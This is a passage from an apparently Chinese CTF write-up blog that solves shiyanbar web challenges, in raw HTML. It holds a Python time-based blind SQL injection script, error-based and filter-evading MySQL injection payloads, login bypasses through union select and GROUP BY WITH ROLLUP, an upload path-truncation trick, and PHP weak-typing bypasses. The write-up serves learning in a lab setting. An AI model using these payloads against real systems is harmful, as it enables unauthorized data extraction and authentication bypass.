class="string">"%') and sleep(5) and '1'='1"</span></div><div class="line">            sql2 = <span class="string">"1.1.1.1' and (select database() like '"</span> + result + payload + <span class="string">"%') and sleep(5) and '1'='1"</span></div><div class="line">            sql3 = <span class="string">"1.1.1.1' and (select case when substring((select table_name from information_schema.tables where table_schema='web4' limit 1 offset 1) from "</span>+str(i)+<span class="string">" for 1)='"</span>+payload+<span class="string">"' then sleep(5) else 0 end ) and '1'='1"</span></div><div class="line">            sql4 = <span class="string">"1.1.1.1' and (select case when substring((select flag from flag) from "</span>+str(i)+<span class="string">" for 1)='"</span>+payload+<span class="string">"' then sleep(5) else 0 end ) and '1'='1"</span></div><div class="line">            req = urllib2.Request(url)</div><div class="line">            req.add_header(<span class="string">'x-forwarded-for'</span>, sql4)</div><div class="line">            f = urllib2.urlopen(req)</div><div class="line">            <span class="keyword">if</span> (time.time() - startTime &gt; <span class="number">5</span>):</div><div class="line">                result += payload</div><div class="line">                <span class="keyword">print</span> <span class="string">"tablename is "</span> + str(i) + <span class="string">": "</span> + result</div><div class="line">                <span class="keyword">break</span></div><div class="line">                <span class="comment"># print f.read()</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure><p><img src="/images/shiyanbar02user.png" alt="user result"></p><p>根据同样办法注入得到database为web4，但是无法用<code>,</code> 查找资料<a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_substring" target="_blank" rel="external">Mysql手册</a>得到无需使用逗号substr和mid的方法</p><h3 id="不使用逗号"><a href="#不使用逗号" class="headerlink" title="不使用逗号"></a>不使用逗号</h3><p>基于时间的盲注：case when xxx then sleep() else xxxx;</p><p>对于substr和mid:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">substr(data from 1 for 1);</div><div class="line">mid(data from 1 for 1);</div></pre></td></tr></table></figure><p>根据这个手法手工和脚本一起使用</p><ol><li><p>先获取表段数 结果为2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1.1.1.1&apos; and (select case when (select count(*) from information_schema.tables where table_schema=&apos;web4&apos;)=2 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></li><li><p>获取第一个表段名的长度 长度为9，第二个表段长度为4（猜测是flag）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.1.1.1&apos; and (select case when length((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 0))=9 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">1.1.1.1&apos; and (select case when length((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 1))=4 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></li><li><p>利用脚本跑出表段名字 第一个字段名为<strong>client_ip</strong> 第二个字段名为<strong>flag</strong></p></li><li>获取<strong>flag</strong>表段中字段的数量、长度和内容<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">字段数为1</div><div class="line">1.1.1.1&apos; and (select case when (select count(column_name) from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;)=1 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">字段名长为4</div><div class="line">1.1.1.1&apos; and (select case when length((select column_name from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;))=4 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">猜测字段名为flag 结果正确</div><div class="line">1.1.1.1&apos; and (select case when substring((select column_name from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;) from 1 for 4)=&apos;flag&apos; then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">先获取内容长度为32  再用脚本跑出flag为cdbf14c9551d5be5612f7bb5d2867853</div><div class="line">1.1.1.1&apos; and (select case when length((select flag from flag))=32 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></li></ol><p><img src="/images/shiyanbar03flag.png" alt="flag"></p><h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><blockquote><p>访问解题链接去访问题目,可以进行答题。根据web题一般解题思路去解答此题。看源码，请求，响应等。提交与题目要求一致的内容即可返回flag。然后提交正确的flag即可得分。web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>简单说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_match(string $pattern , string $subject)</div><div class="line">匹配字符串 /i不区分大小写 返回值有int(0)未匹配到 int(1)匹配到 和false匹配错误</div></pre></td></tr></table></figure></p><p>大致思路：首先看过滤的关键字，那就没办法用<code>union</code>联合查询一个可控的pwd。那就把希望寄托于将<code>$key[&#39;pwd&#39;]==$_POST[&#39;pwd&#39;]</code> 构造成<code>null=null</code>的等式 ，查询资料后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">group by with rollup </div><div class="line">对某个字段汇总（聚合）新增的一条记录字段本身内容为NULL</div></pre></td></tr></table></figure></p><p><img src="/images/shiyanbar04group.png" alt="group by with rollup"><br>构造提交payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd=</div></pre></td></tr></table></figure></p><h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><blockquote><p>到底过滤了什么东西？通过注入获得flag值（提交格式：flag{}）</p></blockquote><p>简单测试过滤了<code>and select union from where # -- informaction</code>等关键词<br>使用<code>/*!select*/</code>这样的MySQL特性绕过<br>构造payload得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1111&apos;  /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></p><p><img src="/images/shiyanbar05sqleasy.png" alt="easy sql"></p><h2 id="简单的sql注入2"><a href="#简单的sql注入2" class="headerlink" title="简单的sql注入2"></a>简单的sql注入2</h2><blockquote><p>有回显的mysql注入</p></blockquote><p>简单测试后发现提交有空格就会爆<code>SQLi detected!</code><br>于是用<code>/**/</code>来替换空格<br>构造payload得（就是在上一关的基础上替换了空格）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos;/**//*!union*//**//*!select*//**/flag/**//*!from*//**/flag/**//*!where*//**/&apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></p><p>得到flag发现和上一关是一样的？？？！！</p><h2 id="简单的sql注入3"><a href="#简单的sql注入3" class="headerlink" title="简单的sql注入3"></a>简单的sql注入3</h2><blockquote><p>mysql报错注入</p></blockquote><p>简单测试后发现 <code>floor updatexml extractvalue</code>这几个关键词被过滤，于是寻找其他函数，找到一篇资料<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="external">十种MySQL报错注入</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">1.floor()</div><div class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div><div class="line"></div><div class="line">2.extractvalue()</div><div class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</div><div class="line"></div><div class="line">3.updatexml()</div><div class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div><div class="line"></div><div class="line">4.geometrycollection()</div><div class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">5.multipoint()</div><div class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">6.polygon()</div><div class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">7.multipolygon()</div><div class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">8.linestring()</div><div class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">9.multilinestring()</div><div class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">10.exp()</div><div class="line">select * from test where id=1 and exp(~(select * from(select user())a));</div></pre></td></tr></table></figure></p><p>于是挑选一个后提交payload，得到flag，我擦？还是和上两关一样？？？！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&apos; and geometrycollection((select * from(select * from(select flag from flag)a)b))%23</div></pre></td></tr></table></figure></p><h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><blockquote><p>看看响应头</p></blockquote><p>从题干信息中得知查看响应头 发现<code>FLAG:UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOjh3bHVoNXFXeQ==</code> 拿去base64解码后得<code>P0ST_THIS_T0_CH4NGE_FL4G:hjlqfHs77</code><br>打开页面显示的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">There is no martial art is indefectible, while the fastest speed is the only way for long success.</div><div class="line">&gt;&gt;&gt;&gt;&gt;&gt;----You must do it as fast as you can!----&lt;&lt;&lt;&lt;&lt;&lt;</div></pre></td></tr></table></figure></p><p>应该是将flag解码后作为内容部分，而key作为参数名，重新提交到这个页面，于是写了个Python得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">@author: iSky0t</span></div><div class="line"><span class="string">@time: 2017/10/4 09:16</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</div><div class="line"></div><div class="line">        url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></div><div class="line">        req = requests.get(url)</div><div class="line">        flag = req.headers[<span class="string">'FLAG'</span>].decode(<span class="string">'base64'</span>).split(<span class="string">':'</span>)[<span class="number">1</span>]</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        payload = &#123;<span class="string">'key'</span>:flag&#125;</div><div class="line">        req = requests.post(url,data=payload)</div><div class="line">        <span class="keyword">print</span> req.text</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><blockquote><p>bypass the upload</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryb3B5YtJ0XKn1kEpP</div><div class="line"><span class="attribute">Content-Disposition</span>: form-data; name="dir"</div><div class="line"></div><div class="line">/uploads/</div><div class="line">------WebKitFormBoundaryb3B5YtJ0XKn1kEpP</div><div class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="y.jpg"</div><div class="line"><span class="attribute">Content-Type</span>: image/vnd.microsoft.icon</div></pre></td></tr></table></figure><p>在上传包中发现有dir的参数，先提交正确上传</p><blockquote><p>Upload: y.jpg<br>Type: image/vnd.microsoft.icon<br>Size: 66.060546875 Kb<br>Stored in: ./uploads/8a9e5f6a7a789acb.php<br>必须上传成后缀名为php的文件才行啊！</p></blockquote><p>于是在<code>/uploads/</code>处截断为<code>/uploads/1.php截断</code>，提交得到flag</p><h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><blockquote><p>密文：a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</p></blockquote><p><img src="http://ctf5.shiyanbar.com/web/web200.jpg" alt="NSCTF web200"><br>可以看到这是一段简单的加密代码，大致的过程就是</p><ul><li>翻转字符串</li><li>for循环遍历字符串 将每个字母的ASCII +1 再转回字符串</li><li>在进行base64编码后 翻转字符串 再进行ROT13编码</li></ul><p>那么我们简单写个脚本逆向下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$encode = base64_decode(strrev(str_rot13(<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>)));</div><div class="line"><span class="comment">//echo $encode;</span></div><div class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($encode); $i++) &#123; </div><div class="line">$_c = substr($encode, $i,<span class="number">1</span>);</div><div class="line">$__ = ord($_c)<span class="number">-1</span>;</div><div class="line">$_c = chr($__);</div><div class="line">$_ = $_.$_c;</div><div class="line">&#125;</div><div class="line">$decode = strrev($_);</div><div class="line"><span class="keyword">echo</span> $decode;</div></pre></td></tr></table></figure></p><h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><blockquote><p>注意备份文件</p></blockquote><p>这个提示 我到最后也没理解有什么作用，打开网页后给出了<code>index.php.txt</code>可以查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;br&gt;&lt;br&gt;</div><div class="line">Can you authenticate to this website?</div></pre></td></tr></table></figure></p><p>这题以前接触过，采用二次urlencode绕过就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</div></pre></td></tr></table></figure></p><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><p>在这边顺便了解了下urlencode的方式</p><blockquote><p><strong>url编码解码</strong>,又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，<br><strong>编码方法:</strong>在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20</p></blockquote><h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><blockquote><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o</p></blockquote><p><img src="/images/shiyanbar06false.png" alt="false"><br>利用PHP弱类型特性绕过<br>使得两个直接比较不相等，但是sha1相等，那只能考虑sha1为false的情况了，两个变量加密都是false，自然相等了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?name[]=a&amp;password[]=b</div></pre></td></tr></table></figure></p><h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><blockquote><p>似乎有人觉得PIN码是不可破解的，让我们证明他是错的。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Forms<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">    PIN:</div><div class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"PIN"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"showsource"</span> <span class="attr">value</span>=<span class="string">0</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Enter<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>发现有个隐藏的showsource的参数，猜测应该是显示源码，把value从0改成1。显示源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$a = $_POST[&quot;PIN&quot;];</div><div class="line">if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123;</div><div class="line">    echo &quot;Congratulations! The flag is $flag&quot;;</div><div class="line">&#125; else &#123;</div><div class="line">    echo &quot;User with provided PIN not found.&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>于是提交pin为-19827747736161128312837161661727773716166727272616149001823847 得到flag</p><h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><blockquote><p>绕过</p></blockquote><p>打开题目地址，右键源文件发现index.txt访问得到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">welcome to simplexue</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line"></div><div class="line"></div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">$conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</div><div class="line">mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</div><div class="line">if ($conn-&gt;connect_error) &#123;</div><div class="line">die(&quot;Connection failed: &quot; . mysql_error($conn));</div><div class="line">&#125; </div><div class="line">$user = $_POST[user];</div><div class="line">$pass = md5($_POST[pass]);</div><div class="line"></div><div class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</div><div class="line">$query = mysql_query($sql);</div><div class="line">if (!$query) &#123;</div><div class="line">printf(&quot;Error: %s\n&quot;, mysql_error($conn));</div><div class="line">exit();</div><div class="line">&#125;</div><div class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">//echo $row[&quot;pw&quot;];</div><div class="line">  </div><div class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</div><div class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;form method=post action=index.php&gt;</div><div class="line">&lt;input type=text name=user value=&quot;Username&quot;&gt;</div><div class="line">&lt;input type=password name=pass value=&quot;Password&quot;&gt;</div><div class="line">&lt;input type=submit&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;a href=&quot;index.txt&quot;&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>粗略看一遍，就觉得pwd返回值可控，那么问题就能解决了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user提交 isky&apos; union select &apos;9819264afc0a223d29938073d8c2c544&apos; as pwd#</div><div class="line">password提交 isky</div></pre></td></tr></table></figure></p><p>得到flag</p><h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><blockquote><p>what a fuck!这是什么鬼东西?</p></blockquote><p>访问页面 应该是 <a href="http://www.jsfuck.com/" target="_blank" rel="external">JSfuck</a><br>然后在console里执行下 一个弹出框显示密码 提交之</p><h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><blockquote><p>找回密码<br>解题链接： <a 